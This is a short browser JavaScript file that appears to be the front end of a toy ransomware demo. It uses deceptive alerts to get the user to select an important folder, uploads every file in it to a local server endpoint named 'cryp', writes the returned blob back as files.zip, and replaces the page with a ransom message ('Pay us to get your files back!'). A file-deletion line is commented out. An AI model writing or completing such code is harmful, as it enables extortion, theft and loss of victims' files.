async function pickFileAndUpload() {
    alert("Start of the super cool process!");
    try{
        alert("Select your favorite(and most important) folder!");
        document.querySelector(".lock").textContent = "🕘";
        const dirHandle = await window.showDirectoryPicker();
        const formData = new FormData();

        for await (const[name, handle] of dirHandle.entries()) {
            if(handle.kind === "file"){
                const file = await handle.getFile();
                formData.append("files", file, file.name)
            }
        }
        
        const response = await fetch('http://localhost:5000/cryp',
            {method: 'POST',
            body: formData}
        );

        //Delete all the files in the directory
        //await dirHandle.removeEntry("superImportantTexte.txt");
        //

        const blob = await response.blob();
        const saveHandle = await dirHandle.getFileHandle("files.zip", { create:true});
        //
        //Find way to dezip...
        //
        
        const writable = await saveHandle.createWritable(); 
        await writable.write(blob);
        await writable.close();

        document.querySelector("h1").textContent = "Pay us to get your files back!";
        document.querySelector(".warning").textContent = "YOU GOT HACKED! YOU GOT HACKED! YOU GOT HACKED!";
        document.querySelector(".lock").textContent = "😈";
        document.querySelector("#sendButton").remove();
    } catch(err) {
        console.error(err)
        alert("Error: " + err.message)
    }
}

document.getElementById('sendButton').addEventListener('click', pickFileAndUpload);